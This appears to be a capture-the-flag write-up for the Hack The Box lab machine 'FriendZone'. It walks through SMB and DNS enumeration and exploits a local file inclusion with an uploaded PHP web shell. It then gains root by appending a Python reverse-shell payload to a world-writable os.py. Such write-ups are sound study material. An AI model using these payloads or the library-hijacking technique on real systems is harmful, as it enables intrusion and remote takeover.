# Hack The Box: FriendZone

**Difficulty:** Easy
**OS:** Linux

FriendZone is an Easy-level Linux machine designed to test enumeration skills and combining multiple common misconfigurations to achieve remote code execution. The initial compromise requires enumerating an SMB share for credentials, conducting a DNS zone transfer to discover hidden subdomains, and leveraging a Local File Inclusion (LFI) vulnerability combined with an SMB write share to execute a PHP web shell. Privilege escalation involves exploiting a writable Python library path executed by a root cron job.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.123
nmap -p 21,22,53,80,139,443,445 -sCV 10.10.10.123
```

The scan reveals a significant number of open ports:
*   **Port 21:** FTP (vsftpd 3.0.3)
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 53:** DNS (ISC BIND 9.11.3-1ubuntu1.2)
*   **Port 80/443:** HTTP/HTTPS (Apache httpd 2.4.29)
*   **Port 139/445:** SMB (Samba smbd 4.7.6-Ubuntu)

We focus on enumerating the web services (80/443), DNS (53), and SMB (139/445). We add the IP address and standard domain `friendzone.red` (found via HTTP headers or certificate SANs) to our local `/etc/hosts` file.

```bash
echo "10.10.10.123 friendzone.red" >> /etc/hosts
```

### Enumerating SMB

We attempt anonymous access to the SMB service using a tool like `smbclient` or `enum4linux`.

```bash
smbclient -L //10.10.10.123 -N
```

This check reveals several shares, including `general`, `Development`, and `Files`. We connect to each accessible share to explore its contents.

```bash
smbclient //10.10.10.123/general -N
```

Inside the `general` share, we find a text file named `creds.txt`.

```text
admin:WORKWORKHACKS31
```

We also check the permissions on the `Development` share. We discover that we have write access to it. We upload an empty text file (`test.txt`) and verify it is successfully written to the share.

### Enumerating DNS (Zone Transfer)

With port 53 open, we attempt a DNS zone transfer (`AXFR`) to reveal all subdomains associated with `friendzone.red`.

```bash
dig @10.10.10.123 friendzone.red axfr
```

The zone transfer is successful, revealing several subdomains, notably:
*   `admin.friendzone.red`
*   `administrator1.friendzone.red`
*   `uploads.friendzone.red`

We add these newly discovered subdomains to our `/etc/hosts` file.

## Web Application Analysis

We navigate to `https://administrator1.friendzone.red` and find a login portal.

### Authenticating & Discovering LFI

We use the credentials extracted from the SMB share (`admin:WORKWORKHACKS31`) to authenticate at the `administrator1.friendzone.red` login portal.

Authentication is successful, and we are presented with a dashboard that indicates the presence of a script named `dashboard.php` and suggests passing an `image_name` or `image_id` parameter to view images.

```text
http://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
```

The `pagename` parameter is highly suspicious. We test it for Local File Inclusion (LFI) by providing relative paths to standard system files. However, the application appends `.php` to the parameter value.

If we input `pagename=timestamp`, the application includes `timestamp.php`. If we input `pagename=../../../../etc/passwd`, it attempts to include `../../../../etc/passwd.php`, which fails.

### Exploiting LFI via SMB

To exploit this LFI and achieve Remote Code Execution (RCE), we must point the `pagename` parameter to a PHP file we control.

We remember our write access to the `Development` SMB share. If we upload a PHP web shell to this share, and we know the absolute path of this share on the Linux filesystem, we can use the LFI vulnerability to include and execute it.

Standard Samba configurations on Ubuntu typically map shares to paths like `/etc/samba` or specific home directories. However, shares are frequently mapped to the root directory or standard `/mnt` or `/var` paths. Based on common configurations or by guessing, the `Development` share might map to `/etc/Development/` or `/var/www/html/Development/`.

We craft a PHP web shell (`shell.php`).

```php
<?php system($_REQUEST['cmd']); ?>
```

We connect to the `Development` share and upload our payload.

```bash
smbclient //10.10.10.123/Development -N
smb: \> put shell.php
```

We guess the absolute path to the share on the target system to be `/etc/Development/`. We construct our LFI payload, omitting the `.php` extension since the application appends it automatically.

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell&cmd=id
```

The command executes successfully, confirming the path and the vulnerability. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory. Checking the `/home` directory reveals a user named `friend`.

We enumerate the web application directories (`/var/www/` and its subdirectories) to search for configuration files containing database credentials or hardcoded passwords.

We discover a database connection file (`mysql_data.conf` or similar).

```bash
cat /var/www/mysql_data.conf
```

The file reveals plaintext database credentials: `friend:Agpyu12!0.213$`.

We test these credentials for password reuse by attempting to authenticate via SSH as the system user `friend`.

```bash
ssh friend@10.10.10.123
# Authentication successful
```

We retrieve the `user.txt` flag from Friend's home directory.

## Privilege Escalation

Enumerating the system as `friend`, we check for `sudo` privileges, scheduled tasks, and world-writable files in common application paths.

```bash
sudo -l
```

The output reveals that the `friend` user cannot run `sudo`. We continue enumerating the system, checking running processes using tools like `pspy`.

We identify a cron job executed by `root` that runs a Python script located in `/opt/server_admin` (e.g., `reporter.py`).

### Abusing Python Library Path

We analyze the `reporter.py` script. The script imports the standard `os` module to execute system commands.

```python
# Snippet from reporter.py
import os
# ...
os.system('...')
```

Because the script is executed by `root` via a cron job, any code within the script runs with root privileges. We check the permissions of the script itself; it is owned by `root` and only writable by `root`.

However, we must check the permissions of the imported modules. The standard Python `os` module is located in the global Python library directory (`/usr/lib/python2.7/` or `/usr/lib/python3.6/`).

We check the permissions of the `os.py` file.

```bash
ls -la /usr/lib/python2.7/os.py
```

The output reveals that the file is owned by `root`, but surprisingly, it has world-writable permissions (`-rw-rw-rw-` or similar), or the directory containing it is world-writable.

Because any user can modify `os.py`, we can inject malicious Python code directly into the standard library module. This technique is known as "Library Hijacking."

We append a reverse shell payload or a command to set the SUID bit on `/bin/bash` to the end of `/usr/lib/python2.7/os.py`.

```python
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.X",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /usr/lib/python2.7/os.py
```

We start a new Netcat listener on our attacking machine.

```bash
nc -lnvp 8888
```

We wait for the cron job to execute `reporter.py`. When the script imports the `os` module, our injected payload executes as `root`.

```bash
# Connection received
id
# uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
